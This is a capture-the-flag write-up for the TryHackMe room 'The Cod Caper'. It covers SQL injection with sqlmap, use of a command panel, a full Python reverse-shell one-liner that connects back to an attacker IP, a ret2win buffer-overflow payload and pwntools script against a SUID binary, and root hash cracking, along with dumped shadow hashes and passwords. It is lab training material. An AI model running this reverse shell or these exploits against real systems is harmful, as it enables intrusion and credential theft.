---
title: "The Cod Caper"
description: "A guided boot2root that starts with a login form that concatenates its inputs, hands you a command panel with a random filename, and leaves a SUID binary with a 32-byte buffer and a shell function nobody calls. A cyclic pattern finds the offset, ret2win reaches the function, and the root hash cracks to a fish-themed password."
difficulty: "Easy"
tags: ["SQL Injection", "SQLMap", "Command Injection", "Reverse Shell", "SUID", "Buffer Overflow", "Ret2Win", "GDB", "Pwntools", "Hash Cracking"]
date: "2026-05-28"
---

## Overview

The Cod Caper is a guided room, and the guidance is visible in its design: each stage points at the next one. That makes it a good room to study rather than race, because almost every step is a recognisable pattern that shows up again on harder machines.

The chain is: a login form at `/administrator.php` that is injectable in three places, a `users` table with one row, a command panel behind the login, a reverse shell as `www-data`, a hidden password file that belongs to a local user, a SUID binary with a textbook stack overflow, and finally a root hash strong enough to require a real wordlist.

There is no flag file at the end. The room asks questions and the final answer is the root password. This post covers the full path and explains *why* each step works — especially the buffer overflow, which is the part most write-ups skip over.

One note before starting: the folder for this room is named `theCodeCaper` and its README calls it "The Code Caper". The room itself is **The Cod Caper**, a pun on the fish story in its intro, and the README's `/room/thecodecaper` link is a typo. Everything below refers to the real room.

The screenshots come from published walkthroughs of the same room, because the local notes contained no images. Instance-specific details such as the target IP differ between runs.

## Room Information

| Field | Value |
|-------|-------|
| Platform | TryHackMe |
| Room | The Cod Caper |
| Difficulty | Easy |
| Category | boot2root / guided |
| Target | `10.49.168.29` (instance-specific) |
| Attack host | `192.168.253.107` (instance-specific) |
| Open ports | 22 (SSH), 80 (HTTP) |
| Skills | SQL injection, command execution, Linux enumeration, SUID analysis, stack buffer overflow, hash cracking |
| Final answer | Root password |

The local nmap was run on 27 May 2026 and the room was completed the following day; the `date` above reflects that.

## Enumeration

### Host Enumeration

The scan is a standard service scan with default scripts attached:

```bash
nmap -sV -sC -oN nmap.txt 10.49.168.29
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
```

Two ports is a small surface, and the versions tell a story. Ubuntu 16.04 shipped OpenSSH 7.2p2 and Apache 2.4.18, so the box was built on Xenial. That matters later: the kernel and libc are old, but nothing in the exploit path depends on them. The binary exploitation stage targets a specific program, not a system CVE, so old versions are just flavour here.

The `http-title` is the important line. "Apache2 Ubuntu Default Page" means the document root holds nothing but the stock `index.html`. There is no application at `/`, so the next move is not to read the page but to look for files that are not linked from it.

![nmap service scan showing SSH on 22 and Apache on 80, with the default Apache page as the HTTP title](/assets/screenshots/thecodcaper/nmap.png)

### Web Enumeration

A directory brute-force finds what the default page hides:

```bash
gobuster dir -u http://10.49.168.29 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,sh
```

The `-x` flag appends each extension to every wordlist entry, so the scan asks for `admin.php`, `admin.txt`, `admin.sh`, and so on. Extensions matter because the interesting file on a PHP/Apache box is almost always a `.php` script, and wordlists usually store bare stems.

The scan returns the usual Apache noise (`/index.html`, `/server-status`) and one file that does not belong: `/administrator.php`.

![gobuster output listing administrator.php alongside the default index page](/assets/screenshots/thecodcaper/gobuster.png)

The local notes compress this step into "found administrator.php with username and password", which skips the interesting part. Gobuster found the *page*; the credentials came from attacking it. That distinction is worth keeping straight, because on a real engagement a discovered login page is the beginning of work, not a result.

## Initial Access: SQL Injection on the Admin Login

Visiting `/administrator.php` gives a plain administrator login with a username field, a password field, and a submit button.

![The administrator login form at administrator.php](/assets/screenshots/thecodcaper/admin-login.png)

A login form is two questions in one. Does it concatenate its inputs into a query, and can that query be bent to return a row you can log in with? sqlmap answers the first question automatically if you tell it to parse the page's forms:

```bash
sqlmap -u http://10.49.168.29/administrator.php --forms
```

`--forms` is the key flag. Without it, sqlmap tests values in the URL; with it, sqlmap fetches the page, finds each `<form>`, and tests every input in it, including the POST body. That is why this works on a login form with no visible parameters.

The scan reports three vulnerable parameters. That number is the room's answer to "How many forms of SQLI is the form vulnerable to?" — it is counting injectable inputs, not forms.

Now the second question: what is in the database? Dumping is more useful than attempting an authentication bypass, because the password may be stored in plain text and reused elsewhere:

```bash
sqlmap -u http://10.49.168.29/administrator.php --forms --dump
```

```text
Database: users
Table: users
[1 entry]
+------------+----------+
| password   | username |
+------------+----------+
| secretpass | pingudad  |
+------------+----------+
```

![sqlmap testing the login form and identifying injectable parameters](/assets/screenshots/thecodcaper/sqlmap-forms.png)

![sqlmap dumping the users table, revealing the pingudad account and its plaintext password](/assets/screenshots/thecodcaper/sqlmap-dump.png)

The password is stored in cleartext. That is the vulnerability behind the vulnerability: even a properly parameterised login would be handing out reusable credentials if the table looked like this. The injection only makes the bad storage visible.

Logging in with `pingudad` / `secretpass` does not take you to a dashboard. It takes you to a command runner.

![The page behind the login, which offers a form for running commands on the server](/assets/screenshots/thecodcaper/command-exec.png)

The URL of that page is a 32-character hexadecimal filename ending in `.php`. It looks like a per-session secret, but published runs of the room show the same name — `/2591c98b70119fe624898b1e424b5e91.php` — which suggests the filename is baked into the room rather than generated. Either way, the scheme is a poor man's access control: the login page writes a script with an unguessable name and tells the browser where it is. Anyone who knows the name can use it without logging in. It is security through obscurity, and since we now know the name, it is just an endpoint:

```bash
curl -s --data-urlencode "cmd=ls -l" \
  http://10.49.168.29/2591c98b70119fe624898b1e424b5e91.php
```

```text
total 20
-rw-rw-r-- 1 root root  378 Jan 15 21:19 2591c98b70119fe624898b1e424b5e91.php
-rw-r--r-- 1 root root 1282 Jan 15 21:30 administrator.php
-rw-r--r-- 1 root root 10918 Jan 15 20:20 index.html
```

Three files in the web root, which answers Task 5.1. The `cmd` parameter goes to something like `shell_exec($cmd)`, and since Apache is running as `www-data`, every command executes with that identity.

## From Command Execution to a Shell

The panel is enough to run commands one at a time, but it is slow, has no environment, and dies when the page times out. A reverse shell is more comfortable.

Start a listener on the attack machine:

```bash
nc -lvnp 1234
```

Then submit a Python one-liner. The local notes saved this exact payload as `shell`:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.253.107",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Read in pieces, it is simple:

- `socket(AF_INET, SOCK_STREAM)` creates a TCP socket.
- `connect((attacker, 1234))` reaches back out through the firewall that blocks inbound connections.
- `dup2(s.fileno(), 0/1/2)` points stdin, stdout, and stderr at the socket, so the shell's input and output travel through the connection instead of the web request.
- `subprocess.call(["/bin/sh", "-i"])` starts an interactive shell, which inherits those redirected descriptors.

![The reverse shell connected back to the listener as www-data](/assets/screenshots/thecodcaper/reverse-shell.png)

The shell is `www-data`, not a person. The next stage is finding a human account, because `www-data` has no home directory, no SSH login, and no useful files.

## A Stable Account

The obvious enumeration is to see who exists:

```bash
cat /etc/passwd
ls -la /home
```

There are two real users: `pingu`, the room's narrator, and `papa`, the father who hid the fish. A shell as either one is more useful than `www-data`, and both have home directories full of files that the web user can often read because of loose permissions.

Pingu's `.ssh` directory is the first stop:

```bash
ls -la /home/pingu/.ssh
cat /home/pingu/.ssh/id_rsa
```

The private key is readable by `www-data`, which is itself a finding — a user's private key should never be world-readable. But the key alone does not get you in: connecting with it still prompts for a password, so the intended path is Pingu's password, not the key. (Some walkthroughs copy the key out and use it together with the password; functionally it adds nothing once the password is known.)

The room's hint is to look for files whose names suggest credentials, which is exactly what a human would do after finding a readable key:

```bash
find / -type f -name "pass*" 2>/dev/null
```

```text
/var/cache/debconf/passwords.dat
/var/hidden/pass
/var/hidden/pass
/var/lib/dpkg/info/passwd.postinst
```

One of those is not a system file. `/var/hidden/pass` is a plain text file, and `cat` prints:

```text
pinguapingu
```

![Enumerating files owned by www-data; the interesting result is the hidden password file](/assets/screenshots/thecodcaper/find-pass.png)

`2>/dev/null` is doing real work here. `find /` touches directories the web user cannot read, and without suppressing stderr the useful result would be buried under thousands of "Permission denied" lines.

With the password, SSH becomes the stable foothold:

```bash
ssh pingu@10.49.168.29
# pinguapingu
```

## Privilege Escalation: The SUID Binary

The room's next task is running LinEnum, a shell script that automates the checks you would otherwise do by hand. The workflow is copy, execute, read:

```bash
scp LinEnum.sh pingu@10.49.168.29:/tmp/
ssh pingu@10.49.168.29
chmod +x /tmp/LinEnum.sh
/tmp/LinEnum.sh
```

Among the SUID files it lists, one stands out because of where it lives and what it is called:

```text
/opt/secret/root
```

That answers Task 6.1. You can find the same thing without LinEnum:

```bash
find / -perm -u=s -type f 2>/dev/null
```

![LinEnum output highlighting the unusual SUID binary in /opt/secret](/assets/screenshots/thecodcaper/suid-find.png)

The permissions explain why this matters:

```bash
ls -la /opt/secret/root
# -rwsr-xr-x 1 root root ... /opt/secret/root
```

The `s` where the owner's execute bit should be means the program runs with the effective UID of its owner — root — no matter who launches it. A SUID binary is not automatically a vulnerability; `sudo`, `passwd`, and `mount` are all SUID and all carefully written. It becomes a vulnerability when the program can be made to do something other than what it was designed to do.

### Reading the Binary

The room supplies the source. Only three things about it matter:

- `main()` calls `get_input()`.
- `get_input()` declares a 32-byte stack buffer and fills it with `scanf("%s", buffer)`.
- A separate function, `shell()`, calls `setuid()`/`setgid()` and then `system("cat /var/backups/shadow.bak")`.

The first two are the bug. `scanf("%s")` has no width limit, so it writes as many bytes as the input contains into a buffer that holds 32. Anything longer overwrites whatever sits above the buffer on the stack, including the saved return address.

The third is the prize. `shell()` is never called by `main()`, so it is dead code from the program's point of view — but it is still compiled into the binary, and a stack overflow lets you redirect execution to it. This is the "ret2win" pattern: instead of injecting shellcode, you return into a function that already exists.

There is another reason `shell()` is the right target. The binary is SUID root, so while it runs, the process has root's effective UID. `shell()` raises that to a real UID as well and then reads `/var/backups/shadow.bak`, a copy of `/etc/shadow` that only root can read. A normal user can read neither the backup nor the original.

### Finding the Offset

The offset is the number of bytes you must write before the bytes that land in EIP, the instruction pointer. Too few and you corrupt the buffer; too many and you miss the return address. The standard way to measure it is a de Bruijn sequence — `cyclic` in pwntools — which is a pattern where every four-byte window is unique. Overflow the buffer with it, see which four bytes end up in EIP, and look up where they occur in the pattern.

Start gdb on the binary:

```bash
gdb /opt/secret/root
```

![gdb loading the SUID binary with pwndbg initialised](/assets/screenshots/thecodcaper/gdb-pwndbg.png)

Then run it with 50 bytes of cyclic input:

```text
r < <(cyclic 50)
```

The process crashes, and the register dump shows the overwritten EIP:

```text
EIP: 0x6161616c ('laaa')
```

![The crash after overflow, with EIP overwritten by the cyclic pattern](/assets/screenshots/thecodcaper/gdb-cyclic-crash.png)

`0x6161616c` is four ASCII bytes read as a little-endian number: `6c 61 61 61` is `l a a a`. Ask the pattern where `laaa` starts:

```text
cyclic -l 0x6161616c
# 44
```

So 44 bytes reach EIP. The arithmetic behind the number: 32 bytes of buffer, plus 12 bytes of stack the compiler placed between the buffer and the return address — saved frame pointer and alignment. You do not need to derive it from the source; cyclic measures it, which is why the technique is preferred over counting bytes by hand.

### Finding the Target Address

The function's address comes from the symbol table:

```bash
readelf -s /opt/secret/root | grep shell
```

or, inside gdb:

```text
disassemble shell
```

![Disassembling the shell function, whose entry point is 0x080484cb](/assets/screenshots/thecodcaper/gdb-disassemble-shell.png)

Either way the answer is `0x080484cb`.

That address is stable across runs because the binary is a 32-bit non-PIE executable. PIE would randomise the load address on every launch and force you to defeat ASLR first. Here the code segment is mapped at a fixed address, so the offsets in the symbol table are the addresses at runtime. The only thing left is byte order.

### Building the Exploit

x86 is little-endian, so `0x080484cb` goes onto the wire as `cb 84 04 08`, least significant byte first. The original one-liner uses Python 2:

```bash
python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
```

If `python` on your box is Python 3, that command fails for a subtle reason: `print` of a `bytes` object writes the repr — `b'AAAA...'` — not the raw bytes, so the payload is mangled before it ever reaches the program. Write to the buffer instead:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*44 + b"\xcb\x84\x04\x08")' | /opt/secret/root
```

The program reads 44 filler bytes, overwrites the return address with the address of `shell()`, and when `get_input()` returns, execution continues inside `shell()` instead of `main()`. The SUID process is still root, so the `cat` succeeds:

```text
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
```

### The pwntools Version

The room also walks through the same exploit with pwntools, which removes the manual byte counting:

```python
from pwn import *

proc = process('/opt/secret/root')
elf = ELF('/opt/secret/root')

shell_func = elf.symbols.shell

payload = fit({
    44: shell_func,   # place the address of shell() after 44 bytes
})

proc.sendline(payload)
proc.interactive()
```

`elf.symbols.shell` resolves the address from the binary, and `fit()` packs it in the correct endianness at the correct offset. If the binary is rebuilt and the address changes, the script still works — which is the point of using a library instead of hard-coded `\xcb\x84\x04\x08`.

![pwntools running the exploit and printing the shadow backup](/assets/screenshots/thecodcaper/pwntools-shell.png)

## Cracking the Root Hash

The dumped line for root is a SHA-512 crypt hash: the `$6$` prefix identifies the algorithm, `rFK4s/vE` is the salt, and the rest is 86 characters of derived key. The `$1$` line for `papa` is the much older MD5 crypt.

hashcat needs the right mode for the algorithm, otherwise it will run forever and never report a match:

```bash
hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt
```

Mode 1800 is `sha512crypt`. The alternative is John, which can infer the format:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hash
```

SHA-512 crypt is deliberately slow — 5000 iterations of SHA-512 per candidate — so this is not instant, but rockyou contains the answer. In one published run, John needed about a minute and a half at a few thousand candidates per second. The password is:

```text
love2fish
```

![hashcat working through rockyou against the SHA-512 crypt hash](/assets/screenshots/thecodcaper/hashcat-crack.png)

I verified the pairing locally rather than trusting the write-up: generating a hash with the same salt reproduces the recorded value byte for byte.

```bash
openssl passwd -6 -salt rFK4s/vE 'love2fish'
# $6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.
```

With the root password, `su root` or `ssh root@10.49.168.29` finishes the room. One published walkthrough also cracks `papa`'s `$1$` hash with mode 500 to `postman`; that is a bonus rather than a required step.

## Answers and Loot

This room has no `user.txt` or `root.txt`. It is question-based, so the "flags" are the answers themselves.

| Question | Answer |
|----------|--------|
| How many ports are open? | 2 |
| What is the http-title? | Apache2 Ubuntu Default Page: It works |
| What version is the SSH service? | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| What version is the web server? | Apache httpd 2.4.18 |
| Important file on the server | `/administrator.php` |
| Admin username | `pingudad` |
| Admin password | `secretpass` |
| How many SQLi parameters? | 3 |
| Files in the web root | 3 |
| Does pingu still have an account? | Yes |
| SSH password | `pinguapingu` |
| Interesting SUID path | `/opt/secret/root` |
| Root password | `love2fish` |

## Commands Used

| Purpose | Command |
|---------|---------|
| Service scan | `nmap -sV -sC -oN nmap.txt 10.49.168.29` |
| Content discovery | `gobuster dir -u http://TARGET -w common.txt -x php,txt,sh` |
| Find injection | `sqlmap -u http://TARGET/administrator.php --forms` |
| Dump credentials | `sqlmap -u http://TARGET/administrator.php --forms --dump` |
| Command exec via panel | `curl --data-urlencode "cmd=ls -l" http://TARGET/<hash>.php` |
| Listener | `nc -lvnp 1234` |
| Reverse shell | `python -c '...socket...dup2...subprocess.call(["/bin/sh","-i"])'` |
| Find credentials | `find / -type f -name "pass*" 2>/dev/null` |
| Stable access | `ssh pingu@TARGET` |
| SUID discovery | `find / -perm -u=s -type f 2>/dev/null` |
| Crash analysis | `gdb /opt/secret/root` then `r < <(cyclic 50)` |
| Offset | `cyclic -l 0x6161616c` |
| Target address | `readelf -s /opt/secret/root \| grep shell` |
| Exploit | `python3 -c 'import sys; sys.stdout.buffer.write(b"A"*44 + b"\xcb\x84\x04\x08")' \| /opt/secret/root` |
| Crack | `hashcat -m 1800 hash rockyou.txt` |
| Root | `su root` |

## Lessons Learned

- **A login form is an injection surface like any other.** `--forms` exists because most real applications put their parameters in POST bodies, not URLs. If sqlmap only ever sees the URL, it sees almost nothing.
- **Plaintext password storage turns a read primitive into full access.** The injection revealed the table, but the real failure was storing `secretpass` as-is. Hashing would have limited the damage to one account.
- **Obscurity is not access control.** The command panel was protected by an unguessable filename, which stops nobody who has logged in once and looked at the address bar.
- **`www-data` is a foothold, not a destination.** The useful things were in other users' home directories: a private key and a hidden password file.
- **SUID is a lead, not a finding.** Thousands of SUID binaries are safe. What makes one dangerous is behaviour you can subvert — here, an unbounded read and an unused function that reads a root file.
- **Cyclic patterns beat byte counting.** The offset was 44, not the 32 you might guess from the source, because of stack padding. Measuring is faster and less error-prone than reasoning about compiler layout.
- **Non-PIE binaries make ret2win trivial.** A fixed code address plus a function that already does what you want means no shellcode, no NX bypass, and no ASLR defeat — just an overwritten return address.
- **Python 2 and Python 3 payloads are not interchangeable.** `print` of a `bytes` object in Python 3 emits a repr, which silently corrupts a binary payload. `sys.stdout.buffer.write` is the portable fix.
- **Pick the hash mode from the prefix.** `$6$` is SHA-512 crypt (1800), `$1$` is MD5 crypt (500). A wrong mode is indistinguishable from an uncrackable hash.
- **Verify a crack instead of trusting it.** Regenerating the hash with `openssl passwd` with the known salt takes a second and removes any doubt about which password produced it.

## References

- [TryHackMe — The Cod Caper](https://tryhackme.com/room/thecodcaper)
- [0xsmiley — The Cod Caper (screenshots: nmap, gobuster, login, sqlmap, rce, shell, find, suid, hashcat)](https://0xsmiley.github.io/2020-05-10-Cod/)
- [aldeid — TryHackMe: The Cod Caper (screenshots: pwndbg, cyclic crash, disassemble shell, pwntools)](https://www.aldeid.com/wiki/TryHackMe-The-Cod-Caper)
- [Raw Pentest Magazine — The Cod Caper write-up](https://blog.raw.pm/en/TryHackMe-The-Cod-Caper-write-up/)
- [Shounak Das — The Cod Caper writeup](https://shounakdas.org/blog/2025-04-29-thm-the-cod-caper-writeup/)
- [hashcat — example hashes and mode numbers](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [pwntools — `cyclic`, `fit`, and `ELF` documentation](https://docs.pwntools.com/en/stable/)
- [OpenSSL — `passwd` and the SHA-512 crypt format](https://docs.openssl.org/master/man1/openssl-passwd/)

*Screenshots are from the walkthroughs credited above, used here because the room folder contained no images; IP addresses differ from the local run.*
